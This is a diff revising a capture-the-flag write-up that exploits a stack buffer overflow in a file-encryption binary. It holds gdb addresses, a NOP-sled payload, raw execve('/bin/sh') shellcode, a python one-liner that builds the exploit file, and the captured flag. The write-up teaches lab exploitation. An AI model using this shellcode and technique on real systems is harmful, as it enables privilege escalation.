@@ -47,7 +47,7 @@ We can exploit this, because after the decryption of the infile, the header is c
 
 In order to verify if this bug works, we will try to encrypt a file full of "a"s, but right before the call to encrypt the data, we will tamper with the header. This will result in an encrypted file that will result in a SEGFAULT when decrypted. I will use password "a", but it doesn't really matter.
 
-Let's try it:
+##### Testing the exploit:
 ```bash
 $ cp -r /home/crudecrypt/ /tmp/delilled
 $ cd /tmp/delilled/crudecrypt
@@ -64,7 +64,7 @@ Program terminated with signal SIGSEGV, Segmentation fault.
 
 Ok, so we know we have control of eip and the stack. After checking that the stack is executable ($ readelf crude_crypt -a | grep GNU_STACK), which it is, we will place nop slide + shellcode in our input and overwrite eip with the address of the middle of the nop slide.
 
-Using gdb, we can determine that the hots variable is located at 0xffffd5c0 and the return address is located at 0xffffd60c. If we provide a reasonable nop sled (32 bytes), this should bring the address of the middle of the nop sled to 0xffffd64c. It doesn't really matter what we use to fill the host variable before encryption, as long as there are no string terminators (I will be using "a"s).
+Using gdb, we can determine that the host variable is located at 0xffffd5c0 and the return address is located at 0xffffd60c. If we provide a reasonable nop sled (32 bytes), this should bring the address of the middle of the nop sled to 0xffffd64c. It doesn't really matter what we use to fill the host variable before encryption, as long as there are no string terminators (I will be using "a"s). For fault tolerance, I will also be repeating the sled address 8 times, because teh return address is located 4 bytes from where the data starts.
 
 ##### The structure of the exploit data will be:
 (sled address)\*8 + (\x90)\*128 + shellcode
@@ -72,7 +72,7 @@ Using gdb, we can determine that the hots variable is located at 0xffffd5c0 and 
 ##### Shellcode:
 \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
 
-Executing the exploit:
+##### Executing the exploit:
 ```bash
 $ python -c 'print "\x4c\xd6\xff\xff"*8 + "\x90"*128 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"' > exploit_data
 $ <use gdb to read exploit_data, overwrite any null characters in host, and store the result in exp_file>
@@ -83,7 +83,8 @@ $ cat flag.txt
 writing_software_is_hard
 ```
 
-Note: If you're having trouble with landing on the nop sled, you can push it around using the arguments. Since the 3rd argument (outfile) doesn't matter, as long as it can be opened, you could try playing with this. Alternatively, you could create a bigger nop sled.
+Note:  
+If you're having trouble with landing on the nop sled, you can push it around by changing the arguments. Since the 3rd argument (outfile) doesn't matter, as long as it can be opened, you could try playing with this. Alternatively, you could create a bigger nop sled. I just got lucked that it worked right away, but I had trouble running it my tmp directory.
 
 *****
 
